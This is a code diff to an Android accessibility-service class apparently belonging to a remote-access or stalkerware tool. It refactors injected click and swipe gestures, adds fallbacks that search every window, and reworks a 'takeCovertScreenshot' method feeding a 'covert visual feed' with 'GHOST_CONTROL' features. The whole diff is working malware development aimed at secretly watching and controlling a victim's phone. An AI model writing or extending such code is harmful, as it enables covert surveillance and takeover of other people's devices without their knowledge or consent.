@@ -1,7 +1,6 @@
 package com.labs.labrats;
 
 import android.accessibilityservice.AccessibilityService;
-import android.accessibilityservice.GestureDescription;
 import android.content.Intent;
 import android.graphics.Path;
 import android.graphics.Point;
@@ -847,16 +846,13 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             try {
-                Path path = new Path();
-                path.moveTo(x, y);
-                GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 150);
-                GestureDescription.Builder builder = new GestureDescription.Builder();
-                builder.addStroke(stroke);
-                
-                return dispatchGesture(builder.build(), null, null);
+                // Use reflection to call API 24+ helper and avoid ClassNotFoundException on older devices
+                Class<?> helper = Class.forName("com.labs.labrats.Api24Helper");
+                java.lang.reflect.Method method = helper.getMethod("dispatchClick", AccessibilityService.class, int.class, int.class);
+                return (boolean) method.invoke(null, this, x, y);
             } catch (Exception e) {
-                Log.e(TAG, "Click Dispatch Error: " + e.getMessage());
-                return false;
+                Log.e(TAG, "Reflection error (API 24): " + e.getMessage());
+                return clickAtLegacy(x, y);
             }
         } else {
             // FALLBACK FOR API < 24: Coordinate-to-Node Mapping
@@ -867,11 +863,33 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private boolean clickAtLegacy(int x, int y) {
         AccessibilityNodeInfo root = getRootInActiveWindow();
-        if (root == null) return false;
+        if (root != null) {
+            boolean success = performClickAtNode(root, x, y);
+            root.recycle();
+            if (success) return true;
+        }
         
+        // Fallback: search all windows
+        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
+        if (windows != null) {
+            for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
+                AccessibilityNodeInfo windowRoot = window.getRoot();
+                if (windowRoot != null) {
+                    boolean success = performClickAtNode(windowRoot, x, y);
+                    windowRoot.recycle();
+                    if (success) return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    private boolean performClickAtNode(AccessibilityNodeInfo root, int x, int y) {
+        Log.d(TAG, "performClickAtNode: x=" + x + ", y=" + y);
         AccessibilityNodeInfo target = findNodeAt(root, x, y);
         boolean success = false;
         if (target != null) {
+            Log.d(TAG, "Found target node: " + target.getClassName() + ", text: " + target.getText());
             // Find nearest clickable parent
             AccessibilityNodeInfo clickable = target;
             while (clickable != null && !clickable.isClickable()) {
@@ -881,12 +899,17 @@ public class IO_Persistence_Manager extends AccessibilityService {
             }
             
             if (clickable != null) {
+                Log.d(TAG, "Found clickable node: " + clickable.getClassName());
                 success = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                Log.d(TAG, "performAction(ACTION_CLICK) result: " + success);
                 if (clickable != target) clickable.recycle();
+            } else {
+                Log.d(TAG, "No clickable parent found for node");
             }
             target.recycle();
+        } else {
+            Log.d(TAG, "No node found at coordinates (" + x + ", " + y + ")");
         }
-        root.recycle();
         return success;
     }
 
@@ -990,46 +1013,46 @@ public class IO_Persistence_Manager extends AccessibilityService {
     public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             try {
-                Path path = new Path(); path.moveTo(x1, y1); path.lineTo(x2, y2);
-                GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, Math.max(duration, 100));
-                GestureDescription.Builder builder = new GestureDescription.Builder();
-                builder.addStroke(stroke);
-                return dispatchGesture(builder.build(), null, null);
+                // Use reflection to call API 24+ helper
+                Class<?> helper = Class.forName("com.labs.labrats.Api24Helper");
+                java.lang.reflect.Method method = helper.getMethod("dispatchSwipe", AccessibilityService.class, int.class, int.class, int.class, int.class, int.class);
+                return (boolean) method.invoke(null, this, x1, y1, x2, y2, duration);
             } catch (Exception e) {
-                Log.e(TAG, "Swipe Dispatch Error: " + e.getMessage());
-                return false;
+                Log.e(TAG, "Reflection error (API 24 swipe): " + e.getMessage());
+                return performLegacySwipe(x1, y1, x2, y2);
             }
         } else {
-            // Legacy Swipe Fallback: Map to Scroll actions if possible
-            Log.d(TAG, "Legacy swipe fallback: Attempting scroll action");
-            AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root == null) return false;
-            
-            AccessibilityNodeInfo target = findNodeAt(root, x1, y1);
-            boolean success = false;
-            if (target != null) {
-                AccessibilityNodeInfo scrollable = target;
-                while (scrollable != null && !scrollable.isScrollable()) {
-                    AccessibilityNodeInfo parent = scrollable.getParent();
-                    if (scrollable != target) scrollable.recycle();
-                    scrollable = parent;
-                }
-                
-                if (scrollable != null) {
-                    int action = (y2 < y1) ? AccessibilityNodeInfo.ACTION_SCROLL_FORWARD : AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
-                    success = scrollable.performAction(action);
-                    if (scrollable != target) scrollable.recycle();
-                }
-                target.recycle();
-            }
-            root.recycle();
-            return success;
+            return performLegacySwipe(x1, y1, x2, y2);
         }
     }
 
-    // ============ SCREENSHOT ============
+    private boolean performLegacySwipe(int x1, int y1, int x2, int y2) {
+        // Legacy Swipe Fallback: Map to Scroll actions if possible
+        Log.d(TAG, "Legacy swipe fallback: Attempting scroll action");
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) return false;
+        
+        AccessibilityNodeInfo target = findNodeAt(root, x1, y1);
+        boolean success = false;
+        if (target != null) {
+            AccessibilityNodeInfo scrollable = target;
+            while (scrollable != null && !scrollable.isScrollable()) {
+                AccessibilityNodeInfo parent = scrollable.getParent();
+                if (scrollable != target) scrollable.recycle();
+                scrollable = parent;
+            }
+            
+            if (scrollable != null) {
+                int action = (y2 < y1) ? AccessibilityNodeInfo.ACTION_SCROLL_FORWARD : AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
+                success = scrollable.performAction(action);
+                if (scrollable != target) scrollable.recycle();
+            }
+            target.recycle();
+        }
+        root.recycle();
+        return success;
+    }
 
-    public interface ScreenshotCallback { void onSuccess(byte[] jpegData); void onFailure(String error); }
     private volatile boolean isScreenshotting = false;
 
     public void takeCovertScreenshot(final ScreenshotCallback callback) {
@@ -1037,45 +1060,22 @@ public class IO_Persistence_Manager extends AccessibilityService {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             isScreenshotting = true;
             try {
-                takeScreenshot(android.view.Display.DEFAULT_DISPLAY, ContextCompat.getMainExecutor(this), new TakeScreenshotCallback() {
+                // Use reflection to call API 30+ helper to prevent class verification errors on legacy devices
+                Class<?> helper = Class.forName("com.labs.labrats.Api30Helper");
+                java.lang.reflect.Method method = helper.getMethod("takeScreenshot", AccessibilityService.class, ScreenshotCallback.class);
+                method.invoke(null, this, callback);
+                
+                // Reset flag after a timeout in case reflection call fails silently
+                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                     @Override
-                    public void onSuccess(ScreenshotResult screenshotResult) {
+                    public void run() {
                         isScreenshotting = false;
-                        android.hardware.HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
-                        try {
-                            android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
-                            if (bitmap != null) {
-                                // Convert hardware bitmap to software to fix bloom/HDR issues
-                                android.graphics.Bitmap softwareBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
-                                if (softwareBitmap != null) {
-                                    int targetWidth = 720;
-                                    int targetHeight = (int) (softwareBitmap.getHeight() * (targetWidth / (float) softwareBitmap.getWidth()));
-                                    android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(softwareBitmap, targetWidth, targetHeight, true);
-                                    
-                                    java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
-                                    // 60% quality reduces the HDR glow artifacts seen in the feed
-                                    scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
-                                    callback.onSuccess(out.toByteArray());
-                                    
-                                    scaled.recycle();
-                                    softwareBitmap.recycle();
-                                }
-                                bitmap.recycle();
-                            } else { callback.onFailure("Buffer wrap failed"); }
-                        } catch (Exception e) { callback.onFailure(e.getMessage()); } 
-                        finally { if (hardwareBuffer != null) hardwareBuffer.close(); }
                     }
-                    @Override
-                    public void onFailure(int i) {
-                        isScreenshotting = false;
-                        callback.onFailure("OS Error: " + i);
-                    }
-                });
+                }, 5000);
             } catch (Exception e) {
                 isScreenshotting = false;
-                callback.onFailure("Screenshot exception: " + e.getMessage());
+                callback.onFailure("Screenshot Bridge Error: " + e.getMessage());
             }
-            new Handler(Looper.getMainLooper()).postDelayed(() -> isScreenshotting = false, 5000);
         } else { 
             String msg = "LIVE_FEED_UNAVAILABLE: Android 11+ is required for the covert visual feed. " +
                         "However, GHOST_CONTROL and GHOST_INSPECTOR remain functional on this device (API " + Build.VERSION.SDK_INT + ").";
